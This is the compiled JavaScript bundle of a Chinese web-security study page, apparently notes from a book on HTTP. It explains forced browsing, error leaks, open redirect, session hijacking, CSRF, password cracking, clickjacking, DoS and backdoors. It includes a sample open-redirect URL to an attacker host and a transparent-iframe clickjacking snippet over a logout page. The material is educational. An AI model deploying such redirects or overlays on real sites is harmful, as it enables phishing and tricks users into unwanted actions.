"),a("p",[s._v("文件目录一览"),a("br"),s._v("\n通过制定文件目录名称，可看见目录中所有文件名")]),s._v(" "),a("p",[s._v("容易被推测的文件名和目录名"),a("br"),s._v("\n文件名称容易被推测")]),s._v(" "),a("p",[s._v("备份文件"),a("br"),s._v("\n自动生成的备份文件无执行权限")]),s._v(" "),a("p",[s._v("经认证才可显示的文件"),a("br"),s._v("\n直接通过URL访问原本必须经过认证才能在Web页面上使用的文件")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E5%BC%BA%E5%88%B6%E6%B5%8F%E8%A7%88%E5%AF%BC%E8%87%B4%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E.png",alt:"强制浏览导致安全漏洞"}})]),s._v(" "),a("h3",{attrs:{id:"_3-2-不正确的错误信息处理"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-2-不正确的错误信息处理"}},[s._v("#")]),s._v(" 3.2 不正确的错误信息处理")]),s._v(" "),a("p",[s._v("Web应用的错误信息内包含对攻击者有用的信息。")]),s._v(" "),a("ul",[a("li",[s._v("Web应用抛出的错误信息")]),s._v(" "),a("li",[s._v("数据库等系统抛出的错误信息")])]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11Web%E5%BA%94%E7%94%A8%E6%8A%9B%E5%87%BA%E7%9A%84%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF.png",alt:"Web应用抛出的错误信息"}}),a("br"),s._v(" "),a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%8A%9B%E5%87%BA%E7%9A%84%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF.png",alt:"数据库系统抛出的错误信息"}})]),s._v(" "),a("p",[s._v("各系统应对详细的错误信息进行抑制设定，或使用自定义错误消息，避免某些错误信息给攻击者以启发。")]),s._v(" "),a("h3",{attrs:{id:"_3-3-开放重定向"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_3-3-开放重定向"}},[s._v("#")]),s._v(" 3.3 开放重定向")]),s._v(" "),a("p",[s._v("开发重定向是一种对指定的任意URL作重定向跳转的功能。假如指定的重定向URL到某个具有恶意的Web网站，那么用户就会被诱导至那个网站。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("http://example.com/?redirect=http://www.xx.jp\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("攻击者把重定向指定的参数改写为已设好的网站：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("http://example.com/?redirect=http://www.hackr.jp\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("开放重定向功能，有可能被攻击者选中并用来作为钓鱼攻击的跳板。")]),s._v(" "),a("h2",{attrs:{id:"_4-因会话管理疏忽引发的安全漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_4-因会话管理疏忽引发的安全漏洞"}},[s._v("#")]),s._v(" 4. 因会话管理疏忽引发的安全漏洞")]),s._v(" "),a("p",[s._v("会话管理是用来管理用户状态的必备功能，但是如果在会话管理上有所疏忽，就会导致用户的认证状态被窃取等后果。")]),s._v(" "),a("h3",{attrs:{id:"_4-1-会话劫持"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_4-1-会话劫持"}},[s._v("#")]),s._v(" 4.1 会话劫持")]),s._v(" "),a("p",[s._v("会话劫持是指攻击者通过某些手段拿到了用户的会话ID，并非法使用此会话ID伪装成用户，达到攻击的目的。\n"),a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%81.png",alt:"会话劫持"}})]),s._v(" "),a("p",[s._v("攻击者可获得会话ID的途径：")]),s._v(" "),a("ul",[a("li",[s._v("通过非正规的生成方法推测会话ID")]),s._v(" "),a("li",[s._v("通过窃听或XSS攻击盗取会话ID")]),s._v(" "),a("li",[s._v("通过会话固定攻击强行获取会话ID")])]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E4%BC%9A%E8%AF%9D%E5%8A%AB%E6%8C%812.png",alt:"会话劫持2"}})]),s._v(" "),a("h3",{attrs:{id:"_4-2-会话固定攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_4-2-会话固定攻击"}},[s._v("#")]),s._v(" 4.2 会话固定攻击")]),s._v(" "),a("p",[s._v("会话固定攻击攻击会强制用户使用攻击者指定的会话ID，属于被动攻击。"),a("br"),s._v(" "),a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB.png",alt:"会话固定攻击"}})]),s._v(" "),a("h3",{attrs:{id:"_4-3-跨站点请求伪造-csrf"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_4-3-跨站点请求伪造-csrf"}},[s._v("#")]),s._v(" 4.3 跨站点请求伪造（CSRF）")]),s._v(" "),a("p",[s._v("CSRF攻击是指攻击者通过设置好陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。")]),s._v(" "),a("p",[s._v("造成的影响：")]),s._v(" "),a("ul",[a("li",[s._v("利用已通过认证的用户权限更新设定信息等")]),s._v(" "),a("li",[s._v("利用已通过认证的用户权限购买商品")]),s._v(" "),a("li",[s._v("利用已通过认证的用户权限在留言板上发表言论")])]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E7%9A%84%E6%94%BB%E5%87%BB.png",alt:"跨站点请求伪造的攻击"}})]),s._v(" "),a("h2",{attrs:{id:"_5-其他安全漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_5-其他安全漏洞"}},[s._v("#")]),s._v(" 5. 其他安全漏洞")]),s._v(" "),a("h3",{attrs:{id:"_5-1-密码破解"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_5-1-密码破解"}},[s._v("#")]),s._v(" 5.1 密码破解")]),s._v(" "),a("p",[s._v("密码破解攻击即算出密码，突破认证。")]),s._v(" "),a("p",[s._v("密码破解有以下两种手段：")]),s._v(" "),a("ul",[a("li",[s._v("通过网络的密码试错")]),s._v(" "),a("li",[s._v("对已加密密码的破解")])]),s._v(" "),a("p",[s._v("密码试错有两种方式：")]),s._v(" "),a("ul",[a("li",[s._v("穷举法")]),s._v(" "),a("li",[s._v("字典攻击")])]),s._v(" "),a("p",[s._v("字典攻击是指利用事先收集好的候选密码，枚举字典中的密码，尝试通过认证的一种攻击手法。"),a("br"),s._v(" "),a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E7%A9%B7%E4%B8%BE%E6%88%96%E5%AD%97%E5%85%B8.png",alt:"穷举或字典"}})]),s._v(" "),a("p",[s._v("从加密数据中导出明文有以下方法：")]),s._v(" "),a("ul",[a("li",[s._v("通过穷举法、字典攻击进行类推")]),s._v(" "),a("li",[s._v("彩虹表")]),s._v(" "),a("li",[s._v("拿到密钥")]),s._v(" "),a("li",[s._v("加密算法漏洞")])]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E7%A0%B4%E8%A7%A3%E5%B7%B2%E5%8A%A0%E5%AF%86%E7%9A%84%E5%AF%86%E7%A0%81.png",alt:"破解已加密的密码"}})]),s._v(" "),a("h3",{attrs:{id:"_5-2-点击劫持"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_5-2-点击劫持"}},[s._v("#")]),s._v(" 5.2 点击劫持")]),s._v(" "),a("p",[s._v("点击劫持是指利用透明的按钮或链接做成陷阱，覆盖在Web页面上。然后诱使用户在不知情的情况下点击的一种攻击手段。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81.png",alt:"点击劫持"}}),a("br"),s._v("\niframe页面中使用透明可点击按钮示例：")]),s._v(" "),a("div",{staticClass:"language-js line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-js"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("iframe id"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"target"')]),s._v(" src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"http://sns.example.jp/leave"')]),s._v(" style"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"opacity:0;filter:alpha(opacity=0)"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("iframe"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("button style"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"position:absolute;top:100;left:100;z-index:-1;"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("PLAY")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("button"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("由于SNS网站作为透明层覆盖目标网站，SNS网站上处于登录状态的用户访问这个钓鱼网站并点击页面上的PLAY按钮后，等同于点击了SNS网站的注销按钮。")]),s._v(" "),a("h3",{attrs:{id:"_5-3-dos攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_5-3-dos攻击"}},[s._v("#")]),s._v(" 5.3 DoS攻击")]),s._v(" "),a("p",[s._v("DoS攻击是一种让运行中的服务呈现停止状态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DoS攻击的对象不仅限Web网站，还包括网络设备及服务器等。")]),s._v(" "),a("p",[s._v("主要有两种攻击方式：")]),s._v(" "),a("ul",[a("li",[s._v("集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈停止状态")]),s._v(" "),a("li",[s._v("通过攻击安全漏洞使服务停止")])]),s._v(" "),a("p",[s._v("集中利用访问请求的DoS攻击，单纯来讲就是发送大量的合法请求。服务器很难分辨何为正常请求，何为攻击请求，因此很难防止DoS攻击。\n"),a("img",{attrs:{src:"/images/HTTP%E5%9B%BE%E8%A7%A3/11DoS%E6%94%BB%E5%87%BB.png",alt:"DoS攻击"}})]),s._v(" "),a("p",[s._v("多台计算机发起的DoS攻击称为DDoS攻击。DDoS攻击通常利用那些感染病毒的计算机作为攻击者的攻击跳板。")]),s._v(" "),a("h3",{attrs:{id:"_5-4-后门程序"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_5-4-后门程序"}},[s._v("#")]),s._v(" 5.4 后门程序")]),s._v(" "),a("p",[s._v("指开发设置的隐藏入口，可不按正常步骤使用受限功能。利用后面程序就能够使用原本受限的功能。")]),s._v(" "),a("ul",[a("li",[s._v("开发阶段作为Debug调用的后门程序")]),s._v(" "),a("li",[s._v("开发者为了自身利益植入的后门程序")]),s._v(" "),a("li",[s._v("攻击者通过某种方法设置的后门程序")])]),s._v(" "),a("p",[s._v("可通过监视进程和通信状态发现被植入的后门程序。但设定在Web应用中的后门程序，由于和正常使用时区别不大，通常很难发现。")])])}),[],!1,null,null,null);a.default=e.exports}}]);